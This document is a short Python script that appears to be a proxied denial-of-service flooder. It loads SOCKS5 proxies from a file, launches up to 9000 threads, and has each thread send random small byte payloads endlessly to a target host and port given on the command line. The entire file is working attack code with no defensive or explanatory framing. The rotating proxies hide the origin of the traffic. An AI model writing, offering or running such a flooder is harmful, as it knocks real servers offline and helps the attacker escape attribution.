import threading
import socket
import socks
import random
import sys
proxies = open('socks5.txt', "r").read().split("\n")
payloads = [b"\x38\x00\x01", b"\x38\x00\x00\x00\x00\x00", b"\x00"*45]
def create_proxied_socket(proxy_host, proxy_port):
    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
    return s

def worker():
    target = (sys.argv[1], int(sys.argv[2]))
    proxy = random.choice(proxies)
    proxy_host = proxy.split(":")[0]
    proxy_port = int(proxy.split(":")[1])
    tcp = create_proxied_socket(proxy_host, proxy_port)
    while True:
        if tcp:
            try:
                print(f"[{proxy}] -> Sent payload!")
                tcp.sendto(random.choice(payloads), target)
            except Exception as error:
                print(f"[{proxy}] -> Breaking down connection. | {error}")
                tcp.close()
                break
    return
while True:
    while threading.active_count() >= 9000: pass
    threading.Thread(target=worker).start()